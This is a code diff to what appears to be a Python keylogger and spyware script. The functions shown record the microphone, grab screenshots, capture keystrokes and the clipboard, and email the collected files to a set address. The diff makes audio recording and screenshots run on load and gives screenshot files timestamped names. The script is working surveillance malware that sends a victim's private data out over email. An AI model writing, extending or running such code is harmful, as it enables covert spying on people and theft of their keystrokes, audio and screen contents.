@@ -122,13 +122,15 @@ def micData():
     sd.wait()
     
     write(filePath + extend + micDataFile, fs, myRecording)
-
+micData()
 
 
 def screenshot():
     im = ImageGrab.grab()
-    im.save(filePath + extend + screenshotDataFile)
+    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Add a timestamp to avoid overwriting
+    im.save(filePath + extend + f"screenshot_{timestamp}.png")
     time.sleep(10)
+screenshot()
 
 
 #Key Logging
@@ -180,8 +182,7 @@ while numOfIterations < numOfIterationsEnd:
     if currentTime > stoppingTime:
         with open(filePath + extend + keyInfoFile, 'w') as f:
             f.write(" ")
-
-        screenshot()
+            
         sendEmail(keyInfoFile, filePath + extend + keyInfoFile, toAddr)
         clipboard()
         numOfIterations += 1
